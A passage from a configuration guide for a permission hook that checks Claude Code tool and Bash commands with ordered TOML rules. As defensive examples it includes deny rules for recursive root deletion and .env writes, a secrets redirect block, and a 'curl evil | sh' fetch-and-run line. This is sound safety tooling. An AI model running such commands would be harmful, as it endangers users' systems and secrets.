# Tool & Bash Rules Configuration Guide

Moriarty provides a powerful tool call validation system that allows you to control which tools and commands Claude Code
can execute. **Tool rules** permission any tool call (Read, Write, Edit, Bash, etc.), while **bash rules** provide
command-level validation specifically for Bash tool calls.

## Table of Contents

- [Quick Start](#quick-start)
- [Tool Rules](#tool-rules)
- [Configuration File](#configuration-file)
- [Path Alias Analysis](#path-alias-analysis)
- [Permission Modes](#permission-modes)
- [Rule Actions](#rule-actions)
- [Pattern Fragments](#pattern-fragments)
- [Security Best Practices](#security-best-practices)
- [Examples](#examples)
- [Troubleshooting](#troubleshooting)

## Quick Start

Create or edit `~/.config/moriarty/tool_rules.toml`:

```toml
[[bash_rules]]
name = "allow-safe-ls"
pattern = "^ls($|\\s)"
action = { type = "Allow" }

[[bash_rules]]
name = "deny-rm-rf-root"
pattern = "^rm\\s+-rf\\s+/"
action = { type = "Deny", value = "Dangerous recursive delete of root directories" }
```

## Tool Rules

Tool rules permission any Claude Code tool call — not just Bash. They are checked **before** bash rules, providing a
unified way to control tool access.

### Quick Start

```toml
[[tool_rules]]
name = "allow-read"
tool = "Read"
action = { type = "Allow" }

[[tool_rules]]
name = "deny-write-env"
tool = "Write"
field = "file_path"
pattern = "\\.env$"
action = { type = "Deny", value = "Cannot write to .env files" }

[[tool_rules]]
name = "deny-all-unknown"
tool = "*"
action = { type = "Ask" }
```

### Structure

```toml
[[tool_rules]]
name = "descriptive-name"
tool = "ToolName"           # Exact tool name or "*" for any tool
modes = ["default", "plan"] # Optional: participate only in these permission modes
allow_local = true           # Optional: require local path/file_path under cwd
field = "field_name"        # Optional legacy field/pattern pair
pattern = "regex-pattern"
conditions = [               # Optional: every condition must match
  { type = "Present", field = "request" },
  { type = "Absent", field = "dangerous" },
  { type = "Equals", field = "enabled", value = true },
  { type = "Matches", field = "path", pattern = "^src/" },
]
action = { type = "ActionType", ... }
```

- **name**: A descriptive name for the rule (used in logs)
- **tool**: Exact tool name to match (e.g., `"Read"`, `"Write"`, `"Edit"`, `"Bash"`, `"Glob"`, `"Grep"`), or `"*"` to
  match any tool
- **modes**: Optional permission-mode allow-list; see [Permission Modes](#permission-modes).
- **allow_local**: Optional boolean. For a condition-free legacy rule, behavior is unchanged: a legacy `field` of `path`
  or `file_path` must be local, no legacy field accepts either local path field, and a non-path legacy field cannot
  satisfy locality. For a rule with `conditions`, every distinct `path` or `file_path` referenced by `Present`,
  `Equals`, or `Matches`, or by the legacy `field` when it names one of those path keys, must resolve locally; `Absent`
  does not select a path. If no path is selected, the legacy fallback still applies. Relative inputs are resolved
  against `cwd`; existing paths are fully canonicalized; non-existent paths are checked by canonicalizing the deepest
  existing ancestor and safely rebuilding the missing suffix so `..` cannot escape above that ancestor. Symlinks that
  resolve outside `cwd` and broken symlinks are rejected. Hard links are treated as ordinary local filesystem entries.
  In the live hook, if locality inspection does not finish within two seconds, every `allow_local` rule is skipped and
  evaluation falls through to a later rule or no match; synchronous analysis runs without this latency deadline.
- **field** + **pattern**: Optional legacy pair. When both are present, the regex matches the named top-level field. If
  only one is present, the entire rule is skipped and reported as a configuration error.
- **conditions**: Optional list of typed top-level input predicates. Conditions are ANDed with each other and with the
  tool name, `allow_local`, and legacy `field`/`pattern`. Use separate ordered rules for alternatives and fallback.
- **action**: `Allow`, `Deny`, or `Ask` (see [Rule Actions](#rule-actions)). Note: `Modify` and `ArgumentFilter` are
  Bash-specific and not available for tool rules.

### Conditions

Conditions address literal top-level keys; dots in `field` names are not JSON-path syntax. A rule with any condition
only matches when `tool_input` is an object.

- `{ type = "Present", field = "name" }`: the key exists, including when its value is `null`.
- `{ type = "Absent", field = "name" }`: the key does not exist. This is the exact inverse of `Present` for object
  inputs.
- `{ type = "Equals", field = "name", value = ... }`: the key exists and its raw JSON value equals the configured
  JSON-compatible TOML value. Equality is recursive and type-sensitive, so boolean `true` differs from string `"true"`;
  arrays and inline tables can be compared exactly.
- `{ type = "Matches", field = "name", pattern = "..." }`: scalar regex matching with the same extraction, cwd-prefix
  stripping, and pattern-fragment expansion as legacy `field`/`pattern`.

Missing or extra condition properties are configuration errors. If any `Matches` pattern cannot expand or compile,
Moriarty drops and reports the **whole rule**, never just the bad condition, because partial compilation could broaden
an Allow rule. Run `moriarty rules lint` to detect dropped rules.

### Regex Field Matching

When `field` and `pattern` are specified, Moriarty extracts the field value from the tool input:

- **Strings**: matched directly (e.g., `file_path`, `content`)
- **Numbers**: converted to string (e.g., `42` → `"42"`)
- **Booleans**: converted to string (`true`/`false`)
- **Arrays/Objects/Null**: cannot be matched (rule doesn't match)

**CWD prefix stripping**: Claude Code sends absolute paths in tool inputs (e.g., `/home/user/project/src/main.rs`).
Before regex matching, Moriarty strips the hook input's `cwd` prefix from field values, so rules can use relative paths.
For example, with `cwd = "/home/user/project"`, a field value of `/home/user/project/src/main.rs` becomes `src/main.rs`
for matching purposes. If the value doesn't start with `cwd`, it's matched as-is. Under `allow_local`, path regexes use
the canonicalized local path before stripping; non-path regexes still read the raw input. `Equals` always compares the
raw JSON value, including for paths, with locality enforced as a separate gate.

### Evaluation Order

```
PreToolUse event (any tool)
  |
  +-> tool_rules engine (first-match-wins among eligible rules)
  |     rule's permission mode is eligible?
  |       -> tool matches?
  |         -> allow_local check (if enabled)
  |         -> every condition matches (if configured)
  |         -> legacy field/pattern regex matches (if configured)
  |     Match found? -> return Allow/Deny/Ask
  |     NoMatch? -> continue
  |
  +-> tool_name == "Bash"?
  |     Yes -> bash_rules engine (same permission mode)
  |     No  -> defer to Claude Code (no decision)
```

Both `tool_rules` and `bash_rules` coexist in the same `tool_rules.toml` config file.

### Examples

Allow reading files, deny writing `.env` files, ask for everything else:

```toml
[[tool_rules]]
name = "allow-read"
tool = "Read"
action = { type = "Allow" }

[[tool_rules]]
name = "allow-glob"
tool = "Glob"
action = { type = "Allow" }

[[tool_rules]]
name = "allow-grep"
tool = "Grep"
action = { type = "Allow" }

[[tool_rules]]
name = "deny-write-env"
tool = "Write"
field = "file_path"
pattern = "\\.env$"
action = { type = "Deny", value = "Cannot write to .env files" }

# Bash tools fall through to bash_rules below
# Everything else requires user approval
[[tool_rules]]
name = "ask-unknown"
tool = "*"
action = { type = "Ask" }

# Bash-specific rules (only used when no tool_rule matches Bash)
[[bash_rules]]
name = "allow-ls"
pattern = "^ls($|\\s)"
action = { type = "Allow" }
```

Use [pattern fragments](#pattern-fragments) in tool rule patterns:

```toml
[pattern_fragments]
project = "/home/user/project"

[[tool_rules]]
name = "allow-project-read"
tool = "Read"
field = "file_path"
pattern = "^{{project}}/"
action = { type = "Allow" }
```

Restrict writes to local files under the current working directory:

```toml
[[tool_rules]]
name = "allow-local-src-writes"
tool = "Write"
allow_local = true
field = "file_path"
pattern = "^src/.*\\.rs$"
action = { type = "Allow" }
```

This rule checks both:

- the `file_path` resolves within the canonicalized hook `cwd`
- after cwd-prefix stripping, the relative path matches `^src/.*\\.rs$`

Require ordinary `subagent` execution starts to use top-level `async = true` and omit top-level `turnBudget`, while
leaving action/status/management calls outside this policy:

```toml
[[tool_rules]]
name = "allow-valid-subagent-start"
tool = "subagent"
conditions = [
  { type = "Absent", field = "action" },
  { type = "Equals", field = "async", value = true },
  { type = "Absent", field = "turnBudget" },
]
action = { type = "Allow" }

[[tool_rules]]
name = "deny-invalid-subagent-start"
tool = "subagent"
conditions = [{ type = "Absent", field = "action" }]
action = { type = "Deny", value = "Normal subagent starts require async=true and must omit turnBudget" }
```

The Allow rule must come first because tool rules are first-match-wins among eligible rules. An input containing
`"action": null` treats the key as present and therefore bypasses both rules, while `"turnBudget": null` is present and
denied. Extra unrelated execution fields do not affect either rule.

## Configuration File

Bash rules are configured in `~/.config/moriarty/tool_rules.toml`. Ordinary command actions use **first-match-wins**
semantics among eligible command rules. `AllowRedirect` and `DenyRedirect` rules form a separate ordered domain: they
never authorize commands and are not shadowed by an earlier command rule.

### Basic Structure

```toml
# Optional trusted shell variables eligible for conservative path-alias analysis.
bash_path_aliases = ["P"]

[[bash_rules]]
name = "descriptive-name"
pattern = "regex-pattern"
modes = ["default", "plan"] # Optional
action = { type = "ActionType", ... }
```

- **name**: A descriptive name for the rule (used in logs)
- **pattern**: A regular expression pattern to match commands
- **modes**: Optional permission-mode allow-list; see [Permission Modes](#permission-modes).
- **action**: What to do when the pattern matches (see [Rule Actions](#rule-actions))

### Rule Evaluation Order

Rules are evaluated top-to-bottom within their domain. The first eligible ordinary rule matching the redirect-free leaf
chooses the command action; each redirect endpoint independently uses the first eligible matching directional redirect
rule. `DenyRedirect` blocks the endpoint, while `AllowRedirect` authorizes it.

```toml
# This rule is checked first
[[bash_rules]]
name = "deny-dangerous-docker"
pattern = "^docker\\s+system\\s+prune"
action = { type = "Deny", value = "Docker system prune is dangerous" }

# This rule is reached if the first rule is ineligible or doesn't match
[[bash_rules]]
name = "allow-other-docker"
pattern = "^docker"
action = { type = "Allow" }
```

**Important**: Place more specific rules before general ones within the same domain. Command and redirect rules may be
interleaved without shadowing one another.

## Path Alias Analysis

Claude Code sometimes shortens a long workspace path with a leading shell assignment and reuses it in later commands.
Moriarty can statically expand selected variables before matching Bash rules:

```toml
bash_path_aliases = ["P"]
```

```bash
P=/work/project/node_modules/.pnpm/@pulumi+pulumi@3.247.0/node_modules/@pulumi/pulumi; \
  rg -n "isUnknown" $P/output.d.ts | head -5
```

With `cwd = /work/project`, the `rg` leaf above is matched as `rg -n "isUnknown" node_modules/.pnpm/.../output.d.ts`,
exactly like the equivalent command containing the literal absolute path. The binding itself grants no permission: every
expanded leaf still has to match the existing ordered rules, out-of-cwd paths remain absolute, and a path containing
`..` is not presented as a safe relative path.

### Trusted Policy

`bash_path_aliases` is an opt-in top-level allow-list. Names must match `[A-Za-z_][A-Za-z0-9_]*`; duplicates are removed
and names are stored in canonical order. Moriarty rejects these shell-control variables at configuration-load time:
`PATH`, `IFS`, `CDPATH`, `GLOBIGNORE`, `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`, `FPATH`, `PS4`, and `PROMPT_COMMAND`.

**Security warning:** configured names are trusted policy. Do not configure variables that change application or tool
behavior, such as compiler flags, package-manager settings, credentials, or configuration-file selectors. Moriarty only
rejects the fixed shell-control set; it cannot know the semantics of every program's environment variables.

### Supported v1 Form

A binding is recognized only when all of these conditions hold:

- it is a leading, synchronous, assignment-only simple command, terminated by `;` or a newline;
- it contains exactly one scalar, non-append assignment and no command, redirect, pipeline peer, `!`, `time`, `&&`,
  `||`, or background `&` separator;
- its name appears in `bash_path_aliases`;
- its unquoted value is an absolute literal matching `^/[A-Za-z0-9/._@+,:=%-]*$`.

Later words may use one plain `$NAME` or `${NAME}` expansion with literal text around it, either unquoted or inside
ordinary double quotes. Supported forms include `$P/output.d.ts`, `--file=$P/input`, `"$P/runtime/mocks.js"`, and
`"$P"/runtime/mocks.js`. Expansion is parser-identified, not textual: single-quoted `$P` stays literal and `$PP` does
not match `P`. Localized `$"…"`, command, arithmetic, process, indirect, length, default-value, transform, and
multiple-expansion forms are not treated as known aliases. Other quoting or escaping in an alias-expanded word is also
unsupported and caps an otherwise-allowed leaf at Ask. A consumed declaration becomes analysis metadata and is not
matched as an executable leaf. An unused declaration remains a leaf requiring confirmation.

Unsupported configured-alias assignments or references do **not** make Moriarty abandon all leaf analysis. The affected
leaf is matched normally, but an Allow is capped at Ask; a Deny still applies, including a Deny on a dangerous later
leaf. Command substitution, backticks, arithmetic substitution, process substitution, and the other existing shell bail
conditions remain whole-command fail-safe cases; a raw command Deny or a DenyRedirect matching a confidently parsed
static endpoint still blocks, while every other outcome prompts.

### Mutation Barriers

Moriarty deliberately avoids modeling Bash mutation targets. An assignment invalidates all aliases only when a binding
is active or the assignment targets a configured alias; unrelated standalone environment assignments remain eligible for
normal rules. A dynamic command name or one of these shell-state commands invalidates **all** active aliases and
requires confirmation: `command`, `builtin`, `exec`, `eval`, `source`, `.`, `trap`, `let`, `unset`, `export`,
`readonly`, `declare`, `typeset`, `local`, `read`, `mapfile`, `readarray`, `getopts`, `printf`, `shopt`, `alias`, or
`unalias`. This conservative rule may prompt for a harmless form, but it prevents later references from being matched
against stale paths without needing per-builtin option semantics.

Redirect targets are classified after known alias expansion. A supported alias may therefore resolve to a project-local
or explicitly approved external endpoint, but the binding still grants no authority by itself. `/dev/null`, descriptors,
and every other redirect endpoint require direction-matching redirect policy. An alias expansion in command position
also requires confirmation; `exec` and wrapper barriers likewise prevent a path alias from auto-authorizing a derived
executable name.

Use `moriarty test bash-rules --cwd <dir> --explain '<command>'` to see consumed bindings, original leaf source,
alias-expanded text, final cwd-normalized match text, each endpoint's direction and allowing or denying redirect rule,
confirmation reasons, unanalyzable Modify rewrites, and the merged decision. Normal `moriarty test bash-rules`,
`--explain`, replay, and the live hook consume the same completed analysis, including one-pass `ArgumentFilter`
revalidation. Suggestions consume the same canonical original policy analysis without computing continuations they do
not use. Explain adds diagnostics without evaluating policy again. With `--json`, each leaf's direction-neutral endpoint
array uses the `redirects` key. A matched endpoint has a typed `decision` of `allowed` or `denied`; `failure` is
reserved for resolution failures and endpoints with no eligible allow rule, while a denied endpoint's configured reason
appears in `matched.action_summary`.

## Permission Modes

Both `tool_rules` and `bash_rules` accept an optional `modes` array with these exact values, matching Claude Code's hook
wire format: `default`, `plan`, `acceptEdits`, `auto`, `dontAsk`, and `bypassPermissions`. Claude Code's UI label
**Manual** arrives as `default`; `manual` is not a valid configuration value.

```toml
[[bash_rules]]
name = "allow-plan-inspection"
pattern = "^git (status|diff)\\b"
modes = ["plan"]
action = { type = "Allow" }

[[tool_rules]]
name = "ask-default-writes"
tool = "Write"
modes = ["default"]
action = { type = "Ask" }
```

- Omitted `modes` means the rule is unrestricted and participates in every mode. This is a permanent, fully supported
  configuration, not a deprecated compatibility form; omission also preserves existing effective hashes.
- `modes = []` means the rule never participates and intentionally disables it.
- Duplicates are removed and values are stored in canonical order.
- Current hook events require `permission_mode`. A restricted rule cannot match a mode-less historical log row or
  explicit test evaluation; unrestricted rules still can. Unknown configuration and live-hook values are rejected. An
  unrecognized historical log value is warned about and treated as mode-less, so replay remains fail-closed for
  restricted rules.
- Ineligible rules remain in place but are skipped. Evaluation falls through to the next eligible rule, preserving
  first-match-wins independently for command rules and redirect rules. Tool-to-Bash fallback, every compound leaf, every
  endpoint, bail handling, and an `ArgumentFilter` recheck all use the same mode.
- Tool-rule `allow_local` preflight runs only when an eligible local tool rule could apply. Bash filesystem endpoints
  resolve when an Allowed command needs redirect authorization, including for non-local endpoint patterns.

Use `moriarty test bash-rules --mode plan '<command>'` to simulate a mode. Omitting `--mode` intentionally runs a
mode-less test evaluation; `--mode` works with `--explain` and `--json` too.

Current completion logs always record the required mode. They retain the compatibility `rule` field for the primary or
deciding rule and add `rules`, a JSON-encoded ordered contributor list. `hooks report` emits both and groups rows by the
exact contributor list; historical records with missing or malformed `rules` fall back to their non-empty singular
`rule`. `rules replay` evaluates each internal row under its recorded mode and includes the mode on divergences.
`rules suggest` tags generated rules with the canonical union of contributing known modes; if any contributing record is
mode-less, the suggestion is unrestricted because its original mode cannot be reconstructed. Historical rows without a
recorded cwd are excluded from replay and suggestion mining, with the excluded count reported, because filesystem policy
cannot be reproduced safely without the original base directory. Historical logs do not record HOME, so replay and
suggestion mining resolve tilde targets against the current process HOME and live filesystem. Strict lint warns on
`modes = []`, missing mode-overlapping redirect policy, and shadowing between same-domain rules whose mode eligibility
overlaps. A redirect rule is shadowed only when the earlier rule covers every direction and locality class the later
rule could match; partial overlap is not reported as unreachable.

## Rule Actions

### Allow

Explicitly allow the command to execute without user confirmation.

```toml
[[bash_rules]]
name = "allow-git-status"
pattern = "^git\\s+status"
action = { type = "Allow" }
```

### AllowRedirect and DenyRedirect

Redirect rules match one resolved endpoint without authorizing the command that contains it. Existing `AllowRedirect`
rules default to `direction = "output"`; use `"input"` for read endpoints and `"both"` for either direction. A
read-write `<>` endpoint requires an allowing `"both"` rule. `DenyRedirect` defaults to both directions and blocks any
endpoint operation in its scope. Put specific denies before broader allows because the redirect domain is
first-match-wins.

For leaves that also contain a command or assignment, ordinary rules see cwd-normalized text with all redirect syntax
removed. A leaf auto-executes only when an ordinary `Allow` rule matches that command text, no `DenyRedirect` matches,
and every redirect endpoint matches an eligible `AllowRedirect` rule. Redirect-only leaves such as `> out` and `< input`
retain their full syntax in the command domain, so endpoint policy alone cannot authorize shell execution.

```toml
[[bash_rules]]
name = "allow-echo"
pattern = "^echo($|\\s)"
action = { type = "Allow" }

[[bash_rules]]
name = "deny-secret-input"
pattern = "^secrets/"
action = { type = "DenyRedirect", value = "Secrets cannot be redirect inputs", direction = "input" }

[[bash_rules]]
name = "allow-project-build-redirects"
pattern = "^build/"
action = { type = "AllowRedirect", allow_local = true }

[[bash_rules]]
name = "allow-project-fixture-input"
pattern = "^fixtures/"
action = { type = "AllowRedirect", allow_local = true, direction = "input" }

[[bash_rules]]
name = "allow-tool-cache"
pattern = "^~/.cache/my-tool/"
action = { type = "AllowRedirect" }

[[bash_rules]]
name = "allow-dev-null"
pattern = "^/dev/null$"
action = { type = "AllowRedirect" }

[[bash_rules]]
name = "allow-stdout-descriptor"
pattern = "^&1$"
action = { type = "AllowRedirect" }
```

A redirect rule's regex sees only the resolved endpoint, never the command. `direction` is optional on both actions:
`AllowRedirect` defaults to `"output"`, while `DenyRedirect` defaults to `"both"`. Resolved project paths are
cwd-relative (`.` for cwd itself), paths under the resolved current home use `~/...`, and other paths use canonical
absolute form. Device and special-file endpoints always use canonical absolute form, so an exact `/dev/null` rule is
independent of cwd. A cwd-relative filename beginning with `~` or `&` receives a `./` prefix; for example, the ordinary
file `&1` matches `./&1`, while descriptor duplication still matches `&1`. Paths that cannot be represented as UTF-8
fail closed instead of using a lossy match string. `allow_local = true` additionally requires a filesystem endpoint to
remain under canonical cwd; it cannot authorize `/dev/null`, another device, or a descriptor token such as `&1`, `&2`,
or `&-`.

Existing symlinks are resolved. For a target that does not exist yet, Moriarty canonicalizes its deepest existing
ancestor and safely rebuilds the missing suffix; broken links, non-directory ancestors, and a `..` escape fail closed.
Unsafe virtual paths under `/proc/self`, `/proc/thread-self`, `/dev/fd`, `/dev/std*`, `/dev/tcp`, or `/dev/udp`,
including targets reached through symlink chains, also fail closed because the hook cannot resolve them as the later
Bash process or safely model Bash-specific network redirects. This is a pre-execution check: the filesystem can still
change between authorization and shell execution (the unavoidable TOCTOU limitation). One two-second deadline covers the
entire live Bash evaluation, including parsing, matching, path resolution, Modify checks, and an ArgumentFilter recheck.
Timeout or blocking-task failure prompts with no rule provenance; synchronous test, replay, explain, and suggestion
evaluation has no deadline.

### Deny

Block the command from executing and show the user an error message.

```toml
[[bash_rules]]
name = "deny-rm-rf"
pattern = "^rm\\s+-rf\\s+/"
action = { type = "Deny", value = "Recursive delete of root directories is not allowed" }
```

### Modify

Transform the command before execution using regex capture groups (`$0`, `$1`, `$2`, etc.).

```toml
[[bash_rules]]
name = "add-dry-run-to-docker-prune"
pattern = "^(docker\\s+system\\s+prune)"
action = { type = "Modify", value = "$1 --dry-run" }
```

The original leaf's redirects are appended to the capture-expanded replacement in source order, preserving their
operators and target spelling. Path-alias declarations referenced by those redirects are retained in the modified
command. For an analyzable rewrite, Moriarty returns the modification only when parsing confirms that the appended
redirects remain attached to the same replacement leaf; a trailing separator or comment that would detach or swallow
them prompts instead. Unanalyzable rewrites follow the fail-closed check below. Every original or replacement endpoint
is checked: a denied endpoint blocks, while an unresolved or unauthorized endpoint prompts. If the rewritten command
contains a construct the splitter cannot analyze, it also prompts when no redirect is apparent because Moriarty cannot
prove that no endpoint will be opened. Alias or shell-state uncertainty in a rewritten leaf has the same fail-closed
result. **Security Warning**: Modify actions use unescaped capture group replacement. Avoid patterns like `^docker (.*)`
that capture arbitrary input. Use specific patterns like `^(docker\\s+system\\s+prune)$` instead.

### Ask

Defer to the user for case-by-case authorization. Claude Code will prompt the user to approve or deny the command.

```toml
[[bash_rules]]
name = "ask-for-sudo"
pattern = "^sudo\\b"
action = { type = "Ask" }
```

### ArgumentFilter

Structurally remove, add, or replace command arguments before execution. Unlike `Modify` which uses regex capture
groups, `ArgumentFilter` matches normalized brush argument values but rewrites alias-expanded source spans, making it
easier to handle flags without activating unchanged quoted, escaped, or literal-glob syntax. Unchanged quoting,
expansions, redirect operators, leading `time`/`time -p` and `!` pipeline prefixes, and a trailing background `&` remain
intact; replacement and added values are shell-quoted. Redirect endpoint policy therefore still applies after filtering.

**Important**: After filtering, the modified command is automatically re-validated against all rules. The filtered
command must match an `Allow` rule, no endpoint may match `DenyRedirect`, and every redirect endpoint must match a
correctly directed `AllowRedirect` rule (or the command must be manually approved) to execute.

#### Removing Arguments

Remove specific flags from commands:

```toml
[[bash_rules]]
name = "cargo-doc-no-browser"
pattern = "^cargo doc.*--open"
action = { type = "ArgumentFilter", remove = ["--open", "-o"], reason = "Browser flags removed" }

[[bash_rules]]
name = "allow-cargo-doc"
pattern = "^cargo doc"
action = { type = "Allow" }
```

The `remove` field supports:

- **Exact matches**: `--open` removes `--open`
- **Prefix matches**: `--open` removes both `--open` and `--open=browser`
- **Position independence**: Removes the argument regardless of where it appears

#### Adding Arguments

Add security flags or default options:

```toml
[[bash_rules]]
name = "docker-run-add-safety"
pattern = "^docker run(?!.* --read-only)"
action = {
  type = "ArgumentFilter",
  add = ["--read-only", "--security-opt=no-new-privileges"],
  reason = "Added security restrictions"
}

[[bash_rules]]
name = "allow-docker-run"
pattern = "^docker run .* --read-only"
action = { type = "Allow" }
```

Arguments are appended to the end of the command.

#### Replacing Arguments

The `replace` field is a table mapping an exact argument token to its replacement. Use it to swap a specific flag for a
safer one:

```toml
[[bash_rules]]
name = "rm-force-interactive"
pattern = "^rm .*-f"
action = {
  type = "ArgumentFilter",
  replace = { "-f" = "-i" },
  reason = "Replaced force mode with interactive"
}

[[bash_rules]]
name = "allow-rm-interactive"
pattern = "^rm .* -i$"
action = { type = "Allow" }
```

`replace` matches whole argument tokens exactly (not prefixes). When you need to drop several variants of a flag and
substitute one safe form, combine `remove` and `add` instead — `remove` also matches `--flag=value` prefixes, which
`replace` does not:

```toml
[[bash_rules]]
name = "rm-force-interactive-variants"
pattern = "^rm .*-f"
action = {
  type = "ArgumentFilter",
  remove = ["-f", "--force"],
  add = ["-i"],
  reason = "Replaced force mode with interactive"
}
```

#### Operation Order

ArgumentFilter operations are applied in this order:

1. **Remove** specified arguments
2. **Replace** specified arguments (if the `replace` field is used)
3. **Add** new arguments

```toml
[[bash_rules]]
name = "combined-operations"
pattern = "^npm start"
action = {
  type = "ArgumentFilter",
  remove = ["--open"],           # First: remove --open
  add = ["--no-browser"],        # Third: add --no-browser
  reason = "Prevent browser from opening"
}
```

#### Re-validation and Security

The filtered command is always re-validated for security:

```toml
# This filter runs first
[[bash_rules]]
name = "filter-cargo-open"
pattern = "^cargo doc.*--open"
action = { type = "ArgumentFilter", remove = ["--open"] }

# The filtered command must match an Allow rule
[[bash_rules]]
name = "allow-cargo-doc"
pattern = "^cargo doc"
action = { type = "Allow" }
```

**What happens**:

1. `cargo doc --open --no-deps` matches the first rule
2. Command is filtered to `cargo doc --no-deps`
3. Filtered command is re-validated
4. Matches the Allow rule → execution allowed

**Security guarantees**:

- If the filtered command doesn't match any Allow rule, it's rejected or requires user approval
- If the filtered command matches a Deny rule, execution is blocked
- Chained ArgumentFilter rules (filter → filter) are prevented to avoid infinite loops

## Pattern Fragments

Pattern fragments allow you to define reusable regex snippets that can be referenced in rule patterns using
`{{fragment_name}}` syntax. This eliminates duplication and makes rules easier to maintain.

### Basic Usage

```toml
[pattern_fragments]
safe_chars = "[^|&;$`()<>{}]"

[[bash_rules]]
name = "allow-ls"
pattern = "^ls{{safe_chars}}*$"
action = { type = "Allow" }
```

The fragment `{{safe_chars}}` is expanded to `[^|&;$`()<>{}]` before the regex is compiled.

### Nested Fragments

Fragments can reference other fragments:

```toml
[pattern_fragments]
safe_chars = "[^|&;$`()<>{}]"
safe_arg = "( {{safe_chars}}+)"
safe_pipe = "( \\| (head|tail|grep){{safe_arg}}*)"

[[bash_rules]]
name = "cargo-with-pipes"
pattern = "^cargo (build|check){{safe_arg}}*{{safe_pipe}}?$"
action = { type = "Allow" }
```

Expansion happens depth-first, fully resolving each `{{fragment}}` reference before moving to the next:

1. `{{safe_arg}}` → `( [^|&;$`()<>{}]+)`
2. `{{safe_pipe}}` → `( \\| (head|tail|grep)( [^|&;$`()<>{}]+)\*)`
3. Final pattern is fully expanded

Nesting is limited to 10 levels, and a single pattern may perform at most 256 fragment substitutions in total. The
second limit exists because a fragment that references several others multiplies at every level, so a shallow set of
fragments can still expand into an enormous regex. Neither limit is reachable by hand-written fragments.

### Built-in Default Fragments

Moriarty provides default fragments for common security patterns:

| Fragment        | Expansion                                                          | Description                                 |
| --------------- | ------------------------------------------------------------------ | ------------------------------------------- |
| `safe_chars`    | ``[^\|&;$`()<>{}]``                                                | Characters that don't allow shell injection |
| `identifier`    | `[a-zA-Z_][a-zA-Z0-9_-]*`                                          | Valid identifier pattern                    |
| `number`        | `[0-9]+`                                                           | Numeric values                              |
| `safe_arg`      | ``( [^\|&;$`()<>{}]+)``                                            | Safe command argument                       |
| `safe_flag`     | `( -[a-zA-Z_][a-zA-Z0-9_-]*)`                                      | Safe command flag                           |
| `safe_path`     | ``( [^\|&;$`()<>{}]+/[^\|&;$`()<>{}]*)``                           | Safe file path                              |
| `safe_pipe_cmd` | `(head\|tail\|grep\|wc\|sort\|uniq)`                               | Safe pipe target commands                   |
| `safe_pipe`     | ``( \\\| (head\|tail\|grep\|wc\|sort\|uniq)( [^\|&;$`()<>{}]+)*)`` | Safe command piping                         |

You can override these by defining your own fragment with the same name.

### Fragment Naming Rules

- Must start with a letter or underscore: `[a-zA-Z_]`
- Can contain letters, numbers, underscores, and hyphens: `[a-zA-Z0-9_-]*`
- Examples: `safe_chars`, `my-fragment`, `_private`

### Circular Dependencies

Fragments cannot reference each other in a cycle:

```toml
# ❌ This will fail with "Circular dependency detected"
[pattern_fragments]
a = "{{b}}"
b = "{{a}}"
```

The system detects circular dependencies and reports an error when loading the config.

Referencing the same fragment from several places is **not** a cycle. A pattern may use both `{{safe_arg}}` and
`{{safe_chars}}` even though `safe_arg` itself expands `{{safe_chars}}` — that is a directed acyclic graph, and it
expands without error. Only a fragment that reaches itself, directly or transitively, is rejected.

## How Bash Commands Are Evaluated

The hook parses each Bash command with a real shell parser and evaluates every leaf simple-command of a compound
(`a && b | c ; d`) **independently**, then merges the per-leaf decisions. A `pattern` therefore only needs to describe a
single command, not a whole pipeline.

- **Configured path aliases are expanded structurally before matching** when they use the exact supported form described
  in [Path Alias Analysis](#path-alias-analysis). Cwd normalization then applies to the expanded value, preserving
  direct-literal rule behavior.
- **Operators split compound commands into leaves**, so a simple `^ls` matches the `ls` leaf of `ls | wc -l` and of
  `cmd && ls`. When a leaf contains a command or assignment, every parsed redirect is removed from its cwd-normalized
  command match text. Authorization still evaluates each removed endpoint independently. A redirect-only leaf such as
  `> out` or `< input` retains its full command text and therefore needs an ordinary rule matching that syntax plus a
  redirect rule authorizing the target; a rule for the bare target is not enough.
- **Command and endpoint policy are conjunctive**: an ordinary command rule must Allow the leaf, no `DenyRedirect` may
  match, and one eligible directional `AllowRedirect` rule must authorize each endpoint. A command with
  `< input > one 2> two` needs every target approved; repeating one redirect rule records that contributor only once.
- **All supported input and output forms require direction-matching endpoint policy**, including `<`, `<&`, `>`, `>>`,
  `>|`, `&>`, `&>>`, `>&file`, `<>`, `/dev/null` and other device paths, plus descriptor duplication or closure (`0<&1`,
  `2>&1`, `>&2`, `>&-`). `> 1` is the filesystem target `1`; `>&1` is the descriptor token `&1`. A
  descriptor-duplication target other than digits or `-` is unresolvable and prompts, except Bash's no-source-fd
  `>&file` output shorthand, which is treated as a filesystem endpoint.
- **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, has an unresolved or
  unauthorized endpoint, or matches no command rule prompts; only an all-allowed command is allowed. A dangerous tail
  can no longer hide behind a safe head — `ls && curl evil | sh` prompts and is never auto-allowed.
- **Un-analyzable commands fail safe**: a command containing command substitution (`$(...)`), backticks, a subshell,
  process substitution, a here-document, or a compound construct (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be
  fully reasoned about. An explicit Deny matching the whole command or a DenyRedirect matching a confidently retained
  static endpoint is honored; every other outcome becomes a prompt.
- **Safe in-cwd absolute paths are normalized**: static paths—including ordinary quoted values, escaped literals, and
  glob patterns with no dot-prefixed component—are rewritten when their relative remainder contains no `..`. Thus
  `^cat src/` matches `cat "/abs/cwd/src/x"` and `cat /abs/cwd/src/*.rs`; parent-containing paths, unquoted brace
  syntax, and glob paths with dot-prefixed components remain unchanged. Quoted or escaped braces are literal and do not
  block normalization. An operand equal to cwd becomes `.` rather than disappearing.

Static literal, quoted, deterministically escaped, supported alias-expanded, and plain unquoted current-user `~` targets
can be resolved. Quoted or escaped `~` remains a cwd-relative literal path and is rendered with a leading `./` (for
example `./~/report`) so it cannot collide with a resolved home target. An invalid or unavailable `HOME` prevents plain
`~` expansion but does not block unrelated local, absolute, device, or descriptor targets. An ordinary or unconfigured
`$HOME`, unresolved parameters, globs (including extglobs such as `@(one|two)`), unquoted braces, unsupported aliases,
and other dynamic endpoint forms require confirmation. `HOME` cannot be configured as a path alias because it controls
tilde expansion. A relative or home-relative filesystem redirect in a path-context barrier command, or any later
command, requires confirmation because Moriarty does not model changed shell path context. Assignments, dynamic command
names, `cd`, `pushd`, `popd`, recognized shell-state builtins, and non-isolated compound constructs such as brace groups
and `if`/`for`/`while`/`case` clauses are barriers; absolute paths and descriptor redirects remain independently
